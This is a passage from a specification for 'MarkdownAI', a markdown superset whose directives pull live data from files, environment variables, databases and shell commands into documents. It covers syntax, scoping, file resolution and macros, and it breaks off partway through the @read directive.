# MarkdownAI Specification
## Version 1.0

> The specification is complete. The language, toolchain, and CLI are fully defined. Ready to build.

> **Documentation that cannot lie.**
> MarkdownAI is a superset of markdown that makes documents live. It connects directly to your filesystem, databases, APIs, and shell -- rendering real data at the point it is needed. Every feature is optional. Nothing is required. It works on existing `.md` files today.

---

## Table of Contents

- [Philosophy](#philosophy)
- [Core Principles](#core-principles)
- [The Header Declaration](#the-header-declaration)
- [Syntax Reference](#syntax-reference)
  - [Directives Overview](#directives-overview)
  - [@include -- Content Inclusion](#include----content-inclusion)
  - [@import -- Definition Import](#import----definition-import)
  - [File Resolution Model](#file-resolution-model)
  - [@env -- Environment Variables](#env----environment-variables)
  - [@define and @end -- Macros](#define-and-end----macros)
  - [@call -- Macro Invocation](#call----macro-invocation)
  - [@phase and @end -- Phase Declarations](#phase-and-end----phase-declarations)
  - [@connect -- Data Source Registry](#connect----data-source-registry)
  - [Source Directives](#source-directives)
  - [The Pipe Operator](#the-pipe-operator)
  - [@render -- Output Sink](#render----output-sink)
  - [@if, @elseif, @else, @endif -- Conditional Blocks](#if-elseif-else-and-endif----conditional-blocks)
  - [@graph -- Dependency Visualization](#graph----dependency-visualization)
- [Runtime Detection](#runtime-detection)
- [Security](#security)
  - [The Jail Model](#the-jail-model)
  - [The Security Config File](#the-security-config-file)
  - [Shell Execution -- @query](#shell-execution----query)
  - [Database Queries -- @db](#database-queries----db)
  - [HTTP Requests -- @http](#http-requests----http)
  - [Filesystem Security -- @include and @import](#filesystem-security----include-and-import)
  - [The Audit Log](#the-audit-log)
  - [Runtime Modes](#runtime-modes)
  - [Built-in Immutable Rules](#built-in-immutable-rules)
  - [Project Hint File](#project-hint-file)
  - [Security Principles Summary](#security-principles-summary)
- [Caching](#caching)
  - [Why Caching Is Critical](#why-caching-is-critical)
  - [@cache Syntax](#cache-syntax)
  - [Cache Modes](#cache-modes)
  - [Cache Key Generation](#cache-key-generation)
  - [What to Cache](#what-to-cache)
  - [Cache on @include and @import](#cache-and-cache-on-include-and-import)
  - [Cache Management -- mai cache](#cache-management----mai-cache)
  - [Cache Storage and Security](#cache-storage-and-security)
  - [Cache and AI Session Consistency](#cache-and-ai-session-consistency)
- [Toolchain Architecture](#toolchain-architecture)
  - [Overview](#overview)
  - [The Parser](#the-parser)
  - [The Template Engine](#the-template-engine)
  - [The Renderer](#the-renderer)
  - [The Stripper](#the-stripper)
  - [The MCP Server](#the-mcp-server)
  - [The Hook](#the-hook)
  - [Build Order](#build-order)
  - [Package Structure](#package-structure)
- [Adoption Path](#adoption-path)
- [Real-World Use Cases](#real-world-use-cases)
- [Package and Distribution](#package-and-distribution)
- [Graceful Degradation Reference](#graceful-degradation-reference)
- [Versioning and Changelog](#versioning-and-changelog)

---

## Philosophy

Standard markdown solved document *formatting*. MarkdownAI solves document *truth*.

Every developer has written documentation that lied. Not intentionally -- it was accurate when written. But code changed, dependencies updated, files moved, schemas evolved. The documentation stayed behind. This is not a discipline problem. It is an architectural problem. Static documents cannot reflect dynamic systems.

MarkdownAI solves this at the root. A MarkdownAI document does not describe your system -- it *queries* it. The document connects directly to your filesystem, your database, your git history, your APIs, your shell. It renders real data at the moment it is read. It cannot drift from reality because it does not store facts -- it retrieves them.

> A MarkdownAI document is not a photograph of your system. It is a live window into it.

The second problem MarkdownAI solves is scale. Markdown has no module system. A growing document either becomes a single unmanageable file or splits into multiple files with no formal relationship between them. There is no include syntax, no variable system, no way to define something once and use it everywhere. Developers copy-paste. Things drift. Things break.

MarkdownAI adds the minimum possible syntax to solve both problems -- live data and document management -- while staying true to markdown's founding principle: the source should be readable by humans without a renderer.

> MarkdownAI is to markdown what TypeScript is to JavaScript -- a superset that adds power without breaking anything that already works.

---

## Core Principles

**1. Optional everything.**
Use one feature, use all, or use none. A single `@include` in an otherwise standard `.md` file is valid MarkdownAI. There are no required directives, no mandatory structure, no minimum complexity. The language grows with your needs.

**2. Works on `.md` files.**
No file extension change required. Add `@markdownai` to the first line of any `.md` file and the toolchain activates. Remove it and everything goes back to standard markdown. Your existing files work today.

**3. Human readable.**
Every directive reads like plain English. `@include ./footer.md` means exactly what it says. `@db query="SELECT * FROM users"` means exactly what it says. No cryptic syntax, no angle brackets, no boilerplate wrappers.

**4. Graceful degradation.**
A standard markdown renderer that does not understand MarkdownAI renders the document without errors. Directives appear as readable plain text. The document is always human-readable regardless of tooling. Nothing breaks.

**5. One source of truth.**
Every piece of repeated content lives in exactly one place. Every piece of dynamic data comes from its authoritative source. The document never stores what it can retrieve.

**6. Context aware.**
When used with the MarkdownAI MCP server, only the content needed for the current task is loaded into the AI context window. A 50-file document system never loads all 50 files simultaneously.

**7. Unix philosophy.**
Directives produce output. Output can be piped. Common pipe commands are built-in and work cross-platform. The Unix toolchain is available for advanced transforms on Unix-compatible platforms. Simple tools compose into powerful pipelines.

**8. The easiest working language ever.**
If someone wants one `@include` in a markdown file, that is all they need. No configuration, no setup, no learning curve. Complexity is available but never imposed.

---

## The Header Declaration

A file declares itself as a MarkdownAI document by placing `@markdownai` as the very first line, or as the first line after an optional YAML frontmatter block (`---` ... `---`).

```
@markdownai
# My Document
```

With a version pin:

```
@markdownai v1.0
# My Document
```

**Version pin format:** `v` followed by `major.minor` -- e.g. `v1.0`, `v1.1`, `v2.0`. The version pin is optional. When present, the runtime warns if the installed MarkdownAI version is older than the pinned version, allowing the author to signal minimum version requirements. When absent, the runtime uses whatever version is installed without any version check.

**This is the runtime detection mechanism.** The MarkdownAI MCP server intercepts file reads, checks the first ~20 bytes for `@markdownai`, and routes accordingly. If the file begins with YAML frontmatter (`---`), a larger window (up to 2 KB) is checked to find `@markdownai` after the closing `---`. Files without the header are never touched by the runtime.

**Why the first line (or first post-frontmatter line):**

- Zero configuration -- the file declares itself
- Near-zero overhead -- only the first line (or frontmatter block) is read before routing decision
- Self-documenting -- any developer opening the file sees immediately it uses MarkdownAI
- Opt-in by default -- files without the header always behave as standard markdown
- Compatible with YAML frontmatter -- Claude Code skill files, Jekyll, Hugo, and similar tools that require frontmatter metadata can coexist with `@markdownai`

**Adding MarkdownAI to an existing file:** Add `@markdownai` as line 1 (or as the first line after existing YAML frontmatter). That is the entire migration.

**Removing MarkdownAI from a file:** Delete the `@markdownai` line. The file returns to standard markdown behavior immediately.

**What a standard renderer does:** Renders `@markdownai` as a plain text paragraph on the first line. Readable, not broken.

---

## Syntax Reference

### Directives Overview

All MarkdownAI directives begin with `@` as the first non-whitespace character on a line. Inline `@` usage -- email addresses (`user@example.com`), social handles (`follow @TheDecipherist`), mentions -- is never interpreted as a directive because `@` is not the first character on the line.

**Unknown directives** are passed through unchanged by all tooling. This protects against false positives and allows future additions without breaking existing files.

**Directive arguments are always static strings.** A directive takes a path, query, or option value as a literal string. Dynamic selection -- choosing between two files, two queries, two values -- is handled by `@if` blocks wrapping the directives, not by embedding expressions inside directive arguments. The only exception is the `if` condition on `@include` and `@import`, which accepts a full JS/bash expression as its condition.

**Directive categories:**

| Category | Directives |
|---|---|
| Document structure | `@include`, `@import`, `@define`, `@call`, `@phase`, `@if` |
| Variables | `@env` |
| Data connections | `@connect` |
| Data sources | `@list`, `@read`, `@query`, `@db`, `@http`, `@tree`, `@date`, `@count` |
| Output | `@render` |
| Visualization | `@graph` |
| Interpolation | `{{ expression }}` |
| Caching | `@cache` |

---

### `{{ }}` -- Inline Interpolation

Inline value substitution embedded directly in markdown prose text. Distinct from directives -- directives are instructions to the engine, interpolation is value substitution into text.

**Basic usage:**

```
Contact us at {{ env.SUPPORT_EMAIL }}
© {{ date format="YYYY" }} {{ env.COMPANY_NAME }}. All rights reserved.
Version {{ read ./package.json path="version" }} -- built {{ date }}
This project contains {{ count ./src/ match="**/*.ts" }} TypeScript files.
```

**Supported expressions inside `{{ }}`:**

```
{{ env.VARIABLE_NAME }}                              -- environment variable
{{ env.VARIABLE_NAME ?? "fallback" }}                -- with nullish coalescing
{{ env.API_URL || env.FALLBACK_URL || "localhost" }} -- fallback chaining
{{ date }}                                           -- current date
{{ date format="YYYY" }}                             -- formatted date
{{ date file="./src/index.ts" type="modified" }}     -- file modified date
{{ count ./src/ match="**/*.ts" }}                   -- file count
{{ read ./package.json path="version" }}             -- scalar JSON value
{{ read ./config.json path="db?.host" }}             -- with optional chaining
{{ env.NODE_ENV == "production" ? "https://api.example.com" : "http://localhost" }}  -- ternary
```

Full JS/bash expression syntax is supported inside `{{ }}`. Any expression that resolves to a scalar string value is valid.

**Only scalar-resolving expressions are valid inline.** Expressions that produce multi-line output (`@list`, `@db` queries, pipe chains) must use directives on their own line, not `{{ }}` interpolation.

**Three immunity rules -- `{{ }}` is never processed inside:**

1. **Fenced code blocks** -- content between ` ``` ` and ` ``` ` is always literal
2. **Inline backtick code** -- content between backticks is always literal
3. **Escaped `\{{`** -- backslash escapes the interpolation, renders literally

```
{{ env.NAME }}          ← resolved to value

`{{ env.NAME }}`        ← literal, inside backticks -- never processed

\{{ env.NAME }}         ← literal, escaped -- renders as {{ env.NAME }}
```

````
```javascript
const name = "{{ user.name }}"   ← literal, inside fenced block -- never processed
```
````

**Escaping:**

Prefix with `\` to render `{{ }}` literally in prose:

```
Use \{{ env.NAME }} in your config to reference environment variables.
```

Renders as:

```
Use {{ env.NAME }} in your config to reference environment variables.
```

The backslash is consumed. The braces appear literally. Identical to markdown's `\*` for literal asterisk.

**How the engine processes interpolation:**

The main parse pass handles all `@` directives on their own lines. After the main pass, a lightweight second pass scans all `markdown` text nodes for `{{ }}` patterns, skipping `code_block` and `inline_code` nodes, processing escape sequences, and resolving each expression. The two passes never conflict.

**What a standard renderer does:** Renders `{{ env.NAME }}` as literal text. Not broken, visible to author, clearly readable as a placeholder.

---

### `@include` -- Content Inclusion

Includes the fully resolved content of another file inline at the point of the directive. The file is processed using the parent's inherited scope -- connections, macros, env vars -- before its output is inlined. Definitions made in the included file bubble up to the shared registry and are available to all files included after it.

Use `@include` when you want the file's **content** to appear in the document.

```
@include ./sections/footer.md
@include ./phases/build.md
@include ../global/copyright.md
```

Paths are relative to the file containing the directive. Includes are resolved recursively. See the File Resolution Model section for circular reference detection and duplicate handling rules.

**Conditional include -- full JS/bash expression support:**

```
@include ./security.md if env.STRICT_MODE == "true"
@include ./debug.md if env.NODE_ENV == "development"
@include ./enterprise.md if env.TIER == "enterprise" || env.TIER == "pro"
@include ./regional.md if env.NODE_ENV == "production" && env.REGION == "us"
```

**Directive arguments are always static strings.** Dynamic path selection uses `@if` blocks:

```
@if env.TIER == "enterprise"
@include ./sections/enterprise.md
@else
@include ./sections/standard.md
@endif
```

**Processing pipeline:**

```
1. Parser reads included file
2. Check for @markdownai header
   YES → process with inherited parent context
   NO  → inline verbatim, no directive processing
3. If processing:
   a. Resolve all directives using inherited context
   b. Bubble up any new @define and @connect to shared registry
   c. Strip @markdownai header from output
   d. Return fully resolved markdown
4. Inline result at @include site in parent
5. Continue processing parent document
```

**Scope model -- closure semantics:**

`@include` follows JavaScript closure semantics. The included file inherits everything from its parent scope and can contribute definitions back upward.

```
Parent scope
├── @connect db
├── @define footer
├── @env COMPANY_NAME
│
└── @include ./sections/users.md
      ├── inherits: db, footer, COMPANY_NAME      ← flows down
      ├── defines: @define user_row               ← bubbles up (available to siblings after)
      └── @include ./partials/user-table.md
            └── inherits: db, footer, COMPANY_NAME, user_row  ← full chain
```

**Sibling ordering matters:**

```
@include ./sections/header.md      ← cannot use user_row
@include ./sections/users.md       ← defines user_row, bubbles up
@include ./sections/footer.md      ← can use user_row
```

**Local scope -- prevent bubble-up:**

```
@define user_row @local
@connect temp_db type="mongodb" uri=env.TEMP_URI @local
```

`@local` prevents the definition from bubbling up to the parent scope. It remains available within the file it is defined in and all files included below it, but is not added to the shared registry and is not visible to sibling files or the parent.

Without `@local`, all `@define` and `@connect` definitions always bubble up.

---

### `@import` -- Definition Import

Imports only the definitions from a file into the current scope. Macros, connections, env defaults. **Nothing renders.** No content appears in the document regardless of what the file contains.

Use `@import` when you want a file's **definitions** but not its content.

```
@import ./shared/defaults.md
@import ./shared/connections.md
@import ./shared/macros.md
```

This is the MarkdownAI module system. `@import` is to `@include` what JavaScript's `import` is to copy-pasting file contents.

**A shared defaults file:**

`shared/defaults.md`:

```
@markdownai

@connect primary type="mongodb" uri=env.MONGODB_URI
@connect analytics type="postgres" uri=env.POSTGRES_URI

@env COMPANY_NAME fallback="My Company"
@env SUPPORT_EMAIL fallback="support@example.com"
@env COPYRIGHT_YEAR fallback="2025"

@define footer
© {{ date format="YYYY" }} {{ env.COMPANY_NAME }}
Contact: {{ env.SUPPORT_EMAIL }}
@end

@define post_phase
## Phase Complete
Update CHANGELOG and commit.
@end
```

Renders nothing. Defines everything.

**Using it:**

```
@markdownai
@import ./shared/defaults.md      ← nothing renders, everything available

# My Document

@call footer                      ← macro from @import
@db query="db.users.find()" as="table"  ← connection from @import
@include ./sections/intro.md      ← content appears
@include ./sections/conclusion.md ← content appears
```

**Separation of concerns -- multiple import files:**

```
@markdownai
@import ./shared/connections.md   ← all @connect definitions
@import ./shared/macros.md        ← all @define definitions
@import ./shared/env.md           ← all @env fallbacks

# My Document
```

Team picks the granularity that suits them.

**`@import` vs `@include` on a definitions file:**

| | `@import ./defaults.md` | `@include ./defaults.md` |
|---|---|---|
| Definitions available | Yes | Yes |
| Content rendered | Never | If any exists |
| Intent | Explicit -- definitions only | Ambiguous |
| Safe on any file | Yes | Only if file has no content |

**Conditional import:**

```
@import ./shared/enterprise-macros.md if env.TIER == "enterprise"
@import ./shared/debug-tools.md if env.NODE_ENV == "development"
```

**Processing pipeline:**

```
1. Parse imported file
2. Check for invalid declarations:
   @phase found → PARSE ERROR, halt immediately (phases only valid in root document)
3. Extract and register definitions:
   a. @define macros       → macro registry (available to parent and all siblings after)
   b. @connect connections → connection registry (available to parent and all siblings after)
   c. @env VAR fallback="x" → fallback registry (VAR resolves to "x" when unset anywhere)
   d. @env VAR (no fallback) → register VAR as expected; warn during validate if unset
4. Discard all content nodes -- nothing renders, ever
5. Continue processing parent document
```

**`@env` inside `@import` files -- fallback registration only:**

`@env` inside an imported file registers fallback values into a shared fallback registry. It never produces content output -- `@import` discards all output regardless.

```
@markdownai

@env COMPANY_NAME fallback="My Company"      ← registers fallback
@env SUPPORT_EMAIL fallback="support@example.com"  ← registers fallback
@env COPYRIGHT_YEAR fallback="2025"          ← registers fallback
@env API_VERSION fallback="v1"              ← registers fallback
@env REQUIRED_VAR                            ← registers as expected, warns if unset
```

After importing this file, every document in the tree that references `{{ env.COMPANY_NAME }}` will resolve to `"My Company"` if `COMPANY_NAME` is not set in the process environment.

**`@env` fallback resolution order:**

When any `@env` or `{{ env.VAR }}` is resolved, the engine consults sources in this priority order:

```
1. Process environment (process.env)           -- highest priority, always wins
2. --env file values (--env .env.production)   -- explicit file overrides
3. Fallback registry from @import files        -- document-level defaults
4. fallback= on the directive itself           -- directive-level default
5. Empty string                                -- final fallback, never an error
```

The process environment always wins. `@import` fallbacks only activate when the variable genuinely isn't set anywhere above them in the resolution chain.

**Circular and duplicate detection:** Both `@include` and `@import` share a single resolution stack and completed-files set. See the File Resolution Model section for full rules including the "first wins" behavior for duplicate imports.

**What the stripper does:** Resolves all imports, inlines resolved definitions for `@call` expansion, removes `@import` tags from output.

---

**`@include` vs `@import` -- the complete distinction:**

| Directive | Content rendered | Definitions available | JavaScript equivalent |
|---|---|---|---|
| `@include ./file.md` | Yes -- at directive site | Yes -- bubbles up | Copy-paste file contents |
| `@import ./file.md` | Never | Yes -- bubbles up | `import * from './file'` |

The rule: if you want content, use `@include`. If you want definitions, use `@import`. If you want both, use `@include` -- it does everything `@import` does plus renders content.

---

### File Resolution Model

`@include` and `@import` share a single resolution model with two data structures maintained by the engine during document processing:

```
resolution_stack  -- files currently being processed (IN_PROGRESS)
completed_set     -- files fully processed (COMPLETE)
```

**State transitions:**

```
File encountered via @include or @import
        ↓
In resolution_stack?   YES → CIRCULAR REFERENCE -- FATAL error
        ↓ NO
In completed_set?
  YES + @import        → SKIP SILENTLY (first wins)
  YES + @include       → RENDER AGAIN (intentional repetition)
        ↓ NO
Push to resolution_stack (IN_PROGRESS)
Process file
Pop from resolution_stack
Add to completed_set (COMPLETE)
```

**Three outcomes, clearly defined:**

**1. Circular reference -- FATAL, always halts**

A file that is `IN_PROGRESS` is encountered again via any `@include` or `@import` directive anywhere in the tree. Infinite loop -- no output possible.

```
ERROR: Circular reference detected

  a.md   (line  5)  @include b.md
  b.md   (line 12)  @import  c.md
  c.md   (line  3)  @include a.md  ← cycle here

  Chain: a.md → b.md → c.md → a.md

  Circular references always halt regardless of --strict mode.
```

The error shows every file in the chain, the line number and directive type for each step, and marks the exact point where the cycle closes. Always FATAL -- no flag suppresses it, no graceful degradation possible.

**2. Duplicate `@import` -- skip silently**

A file that is `COMPLETE` is encountered again via `@import`. Its definitions are already registered. Nothing to do.

```
root.md  @import ./shared/defaults.md   ← processes shared/defaults.md, registers macros
root.md  @include ./sections/users.md
         users.md @import ./shared/defaults.md  ← COMPLETE, skip silently
root.md  @include ./sections/footer.md
         footer.md @import ./shared/defaults.md ← COMPLETE, skip silently
```

`shared/defaults.md` is processed exactly once. All three documents that reference it get its definitions. No re-processing. No duplicate registration. No error or warning.

This is the "first wins" rule. Whoever triggers the first `@import` of a file owns the processing. All subsequent `@import`s of the same file are free no-ops.

**3. Duplicate `@include` -- renders again**

A file that is `COMPLETE` is encountered again via `@include`. Its content is rendered at the new call site. This is intentional -- `@include` means "put this content here." If you call it twice, you want the content twice.

```
@include ./shared/footer.md    ← renders footer content here
[... more document ...]
@include ./shared/footer.md    ← renders footer content here again
```

Both render. No error. No warning. Intentional repetition is valid.

**Cross-directive circularity -- covered by the shared stack:**

A mixed chain of `@include` and `@import` is detected by the shared resolution stack:

```
a.md  @include b.md    ← b.md pushed to stack: [a.md, b.md]
b.md  @import a.md     ← a.md is IN_PROGRESS → CIRCULAR FATAL
```

The directive type does not matter for circular detection. Both push to and check the same stack.

Resolves an environment variable. Behavior depends on context -- standalone in a document, inline via `{{ }}`, or inside an `@import` file.

**Standalone -- own line in a document or macro body:**

```
@env SUPPORT_EMAIL
@env COPYRIGHT_YEAR
@env PROJECT_VERSION
```

Resolves and outputs the value as a paragraph. Useful inside `@define` macro bodies and phase content where the value occupies its own line.

**With fallback:**

```
@env DATABASE_URL fallback="localhost:27017"
@env SUPPORT_EMAIL fallback="support@example.com"
@env API_VERSION fallback="v1"
```

**Inline in prose -- use `{{ }}`:**

```
Contact us at {{ env.SUPPORT_EMAIL }}
© {{ date format="YYYY" }} {{ env.COMPANY_NAME }}. All rights reserved.
Version {{ env.PROJECT_VERSION }}
```

For value substitution embedded in sentences, always use `{{ env.VARIABLE }}` interpolation syntax.

**Inside `@import` files -- fallback registration:**

`@env` inside an `@import` file registers fallback values into a shared fallback registry. No content is output -- `@import` discards all output.

```
@env COMPANY_NAME fallback="My Company"     ← registers document-level default
@env REQUIRED_VAR                            ← registers as expected, warns if unset
```

See the `@import` section for the full fallback resolution order.

**Resolution order for any env var lookup:**

```
1. Process environment (process.env)           -- always wins
2. --env file values                           -- explicit file overrides
3. Fallback registry from @import files        -- document-level defaults
4. fallback= on the directive itself           -- directive-level default
5. Empty string                                -- final fallback
```

If the variable is not set anywhere in the chain and no fallback is provided, resolves to empty string. Never an error unless `--strict` is set and `mai validate` has flagged the variable as expected.

---

### `@define` and `@end` -- Macros

Defines a named reusable block. Not rendered at definition -- only rendered when called.

```
@define final_update
## Post-Phase Update

Update `CHANGELOG.md` with phase summary.
Run project audit and confirm zero violations.
Commit all changes.
@end
```

**With parameters:**

```
@define run_audit(target, strict)
## Audit: {{ target }}

Run audit on `{{ target }}` with strict={{ strict }}.
@end
```

Parameters are referenced inside the body with `{{ paramname }}`. When called, argument values are substituted. Unspecified parameters resolve to empty string -- there is no error for missing arguments. If a meaningful default is needed, document it in the macro or use `{{ strict || "false" }}` inside the body.

**Local scope -- `@local`:**

`@local` prevents the macro from bubbling up to the parent scope. Stays visible within the defining file and its children only.

```
@define user_row @local
  | {{ name }} | {{ email }} | {{ role }} |
@end

@define run_audit(target, strict) @local
## Audit: {{ target }}
Run audit on `{{ target }}`.
@end
```

Without `@local`, all macros bubble up to the shared registry and are available to all sibling files included after the defining file and to the parent.

**Complete `@define` grammar:**

```
@define <name>                             -- no params, global scope
@define <name> @local                      -- no params, local scope
@define <name>(<param1>, <param2>)         -- with params, global scope
@define <name>(<param1>, <param2>) @local  -- with params, local scope
```

`@local` is always the last token on the definition line if present. It is unambiguous -- parameters are inside `()`, `@local` is outside. No parameter can be named `@local` because parameter names never start with `@`.

**Macros can contain any directive including dynamic ones:**

```
@define project_status
## Current Project State

- Files: @list ./src/ match="**/*.ts" | wc -l TypeScript files
- Version: {{ read ./package.json path="version" }}
- Last commit: @query "git log --oneline -1"
- Coverage: {{ read ./coverage/summary.json path="total.lines.pct" }}%
@end
```

Define once. Call from any phase. Always reflects live state at the moment it is called.

**Scope:** Macros defined in the root document are available to all phases via the MCP server's macro registry. Macros defined with `@local` are scoped to their file and children only.

---

### `@call` -- Macro Invocation

Invokes a defined macro at the call site.

```
@call final_update
@call run_audit(target="src/", strict=true)
@call project_status
```

The resolved content replaces the `@call` directive. Dynamic directives inside the macro execute at call time.

---

### `@phase` and `@end` -- Phase Declarations

Declares a named phase with associated content and transition rules. The MCP server loads only the active phase into the AI context window.

```
@phase setup
  @include ./phases/setup.md
  @on complete -> plan
@end

@phase plan
  @include ./phases/plan.md
  @on complete -> build
@end

@phase build
  @include ./phases/build.md
  @include ./phases/security.md if env.STRICT_MODE == "true"
  @on complete -> @call final_update
  @on complete -> test
@end

@phase test
  @include ./phases/test.md
  @on complete -> @call final_update
  @on complete -> deploy
@end
```

**`@on complete ->`** declares what happens when a phase finishes. Three forms:

```
@on complete -> build                  ← transition to named phase
@on complete -> @call final_update     ← execute macro
@on complete -> @call final_update     ← both: multiple @on complete lines
@on complete -> test                      all execute, top to bottom, in order
```

Multiple `@on complete ->` lines all execute sequentially in the order they are written. In the `build` phase above, `final_update` macro executes first, then the engine transitions to `test`.

**`@on complete ->` is only valid inside `@phase ... @end` blocks.** Using it outside a phase block is a parse error -- not a passthrough, not silently ignored.

**AST structure:**

```typescript
interface PhaseNode {
  type: "phase"
  name: string
  body: ASTNode[]             // @include, @import, @call etc
  transitions: TransitionNode[]
}

interface TransitionNode {
  type: "transition"
  event: "complete"           // only "complete" currently -- extensible in future
  action: TransitionAction
}

type TransitionAction =
  | { type: "phase"; name: string }
  | { type: "macro"; name: string; args: Record<string, string> }
```

Multiple `@on complete ->` lines produce multiple `TransitionNode` entries in the `transitions` array, executed in order.

**Future extensibility:** The `event` field on `TransitionNode` is currently always `"complete"`. The `@on` pattern is designed for extension -- `@on error ->`, `@on timeout ->` are reserved for future versions.

Phases are entirely optional. A document without phases is loaded in full.

**`@phase` is only valid in the root document.**

The root document is the file specified directly on the command line or read directly by the MCP server. `@phase` in any included or imported file behaves differently by context:

| Context | `@phase` behavior |
|---|---|
| Root document | Valid -- phase declarations registered, transitions active |
| `@include`d file | `@phase`/`@end` tags stripped, body content renders normally |
| `@import`ed file | **Parse error** -- halts immediately with actionable message |

**Error when `@phase` appears in an imported file:**

```
ERROR: @phase declaration in non-root file

  File:        ./shared/workflow.md
  Line:        3
  Imported by: ./root.md (line 2)

  @phase declarations are only valid in the root document.

  To resolve one of:
    Move @phase declarations to the root document
    Use @include instead of @import if content rendering is the intent
```

**Why `@include`d files strip phases silently:**

An included file's `@phase` structure is ignored -- the content renders but the phase boundaries are meaningless since the included content is inlined into the parent. This allows phase content files (the files referenced inside `@phase` blocks) to themselves contain `@phase` markers as structural documentation without causing errors.

**Why `@import`ed files error on phases:**

`@import` is a definition import -- it should contain only macros, connections, and env fallbacks. A `@phase` declaration in an imported file signals a structural misunderstanding by the author. An immediate error with a clear message is more helpful than silent discard.

---

### `@connect` -- Data Source Registry

Defines named database connections. Declared once at the top of the document, referenced by name in any `@db` directive throughout the document and all included files.

```
@connect primary type="mongodb" uri=env.MONGODB_URI
@connect analytics type="postgres" uri=env.POSTGRES_URI
@connect cache type="redis" uri=env.REDIS_URI
@connect metrics type="mysql" uri=env.MYSQL_URI
```

**Supported types:** `mongodb`, `postgres`, `mysql`, `mssql`, `sqlite`, `redis`, `elasticsearch`

Connection strings always reference environment variables -- never hardcoded credentials. Documents are safe to commit to version control.

**Local scope -- `@local`:**

`@local` prevents the connection from bubbling up to the parent scope. Useful for one-off connections needed only within a specific included file.

```
@connect temp_db type="mongodb" uri=env.TEMP_URI @local
```

**Complete `@connect` grammar:**

```
@connect <name> type="<type>" uri=<uri>          -- global scope
@connect <name> type="<type>" uri=<uri> @local   -- local scope
```

`@local` is always the last token if present. Connection options (`type=`, `uri=`) always precede it.

**Connection resolution order for `@db`:**

1. `using="name"` -- looks up named `@connect` definition by name
2. `uri=env.VAR` -- inline connection string on `@db`, no `@connect` needed
3. Single `@connect` defined -- used automatically, `using` optional
4. Error -- no connection resolvable

**Single connection -- `using` is optional:**

```
@connect db type="mongodb" uri=env.MONGODB_URI

@db query="db.users.find()"        ← uses the only connection automatically
```

**Multiple connections -- `using` required:**

```
@connect primary type="mongodb" uri=env.MONGODB_URI
@connect analytics type="postgres" uri=env.POSTGRES_URI

@db using="primary" query="db.users.find()"
@db using="analytics" query="SELECT * FROM events"
```

**Inline connection -- no `@connect` needed:**

```
@db uri=env.MONGODB_URI query="db.users.find()"
```

For one-off queries without polluting the document header.

`@connect` directives are processed at document load time. The MCP server establishes connections once and reuses them across all directive calls in the session.

**What the stripper does:** Removes `@connect` directives entirely. Connection definitions have no meaning in static output.

---

### Source Directives

Source directives query a data source and produce output. They initiate pipelines -- they never receive piped input. All source directive output flows into optional Linux transform commands and terminates at `@render`.

**The source / transform / sink model:**

```
Sources          Transforms                        Sink
───────          ──────────                        ────
@list    ──┐
@read    ──┤     Built-in (cross-platform):
@db      ──┤──►  grep, sort, head, tail, ──────► @render
@http    ──┤     wc -l, uniq
@query   ──┤
@tree    ──┤     Shell-dependent (Unix/WSL):
@count   ──┘     awk, sed, jq, xargs, cut...
```

Every source produces output. Output flows through zero or more Linux transform stages. `@render` consumes final output and formats it as markdown. Sources never receive pipes -- they only produce them.

**The `as` shorthand:**

Every source directive supports `as` as a shorthand for `| @render type="..."`:

```
@read ./data/users.csv as="table"
```

is identical to:

```
@read ./data/users.csv | @render type="table"
```

Use `as` for simple direct rendering. Use the pipe form when Linux transforms are needed between source and sink.

**The `columns` option:**

All structured data sources (`@read`, `@list`, `@db`) support `columns` for selecting and renaming output fields.

```
columns="name,email,role"                        # select, keep original names
columns="first_name:Name,email:Email"            # select and rename
columns="name,email:Email,created_at:Joined"     # mix -- some renamed, some not
```

Format is `source_key:Display Name`. The `:Display Name` part is optional. If omitted the original key is used as the header. Applies to CSV headers, JSON keys, and database column names uniformly.

---

#### `@list` -- List Items From Any Source

Lists items from a filesystem directory, a JSON array, or a CSV file. One item per line. Output is always suitable for piping.

**Filesystem -- list files or directories:**

```
@list ./src/ match="**/*.ts"
@list ./phases/ match="phase-*.md"
@list ./src/ match="**/" type="dirs"
@list ./src/ match="**/*.ts" as="numbered"
```

**JSON array -- list items from a JSON file:**

```
@list ./data/users.json as="table"
@list ./data/products.json path="items" columns="name:Product,price:Price,stock:Stock" as="table"
@list ./data/products.json path="items" where="stock>0" columns="name:Product,price:Price" as="table"
```

`path` is dot-notation into the file. If omitted, root must be an array.

**JSON object -- list keys or values:**

```
@list ./package.json path="dependencies" mode="keys"
@list ./package.json path="dependencies" mode="values"
@list ./package.json path="dependencies" mode="entries"
```

`mode="keys"` -- one key per line. `mode="values"` -- one value per line. `mode="entries"` -- `key=value` per line.

`mode` and `as` are orthogonal. `mode` controls what data is extracted from the object. `as` controls how it is rendered:

```
@list ./package.json path="dependencies" mode="keys" as="list"
@list ./package.json path="dependencies" mode="entries" as="table"
@list ./package.json path="scripts" mode="entries" as="code"
```

**CSV file -- list rows:**

```
@list ./data/users.csv as="table"
@list ./data/users.csv columns="first_name:Name,email:Email,role:Role" as="table"
@list ./data/users.csv columns="name:Name,email:Email" where="role==admin" as="table"
@list ./data/products.csv columns="name:Product,price:Price" where="stock>0" as="table"
```

**All options:**

| Option | Controls | Description | Default |
|---|---|---|---|
| `match` | Filesystem | Glob pattern | `*` |
| `type` | Filesystem | `files`, `dirs`, `both` | `files` |
| `depth` | Filesystem | Max directory depth | unlimited |
| `path` | JSON | Dot-notation selector into file | root |
| `mode` | JSON objects | `keys`, `values`, `entries` -- what to extract from object | none |
| `columns` | Structured data | `key:Name,key2:Name2` -- select and rename fields, dot-notation supported | all |
| `where` | Structured data | Row filter -- full expression system, field name on left | none |
| `skip` | CSV | Header rows to skip | `0` |
| `collapse` | Nested data | `true` -- stringify nested objects and arrays inline | false |
| `as` | Output | Shorthand for `\| @render type="..."` -- any valid render type | none |

`mode` and `as` are fully orthogonal -- `mode` extracts, `as` renders. Both can be used together.

**`where` -- row filter expression:**

`where` accepts the full MarkdownAI expression system. The left-hand side is a field name or dot-notation path into the row data. All JS/bash operators are valid.

```
where="role==admin"
where="stock>0"
where="active==true"
where="role==admin && active==true"
where="role==admin || role==editor"
where="price>=100 && stock>0"
where="(role==admin || role==editor) && active==true"
where="address.country==US"
where="address?.city==London"
where="deletedAt==null"
where="email!=null && role!=guest"
```

See the `@if` section for the full operator reference. The same operators apply -- the only difference is the left-hand side references a row field rather than an env var.

**Output:** One item per line, suitable for piping into Linux commands or `@render`.

---

#### `@read` -- Read From Structured Files

Reads values, arrays, or entire datasets from structured files. Supports JSON, YAML, TOML, CSV, and `.env` files.

**Single value -- inline scalar (JSON, YAML, TOML):**

```
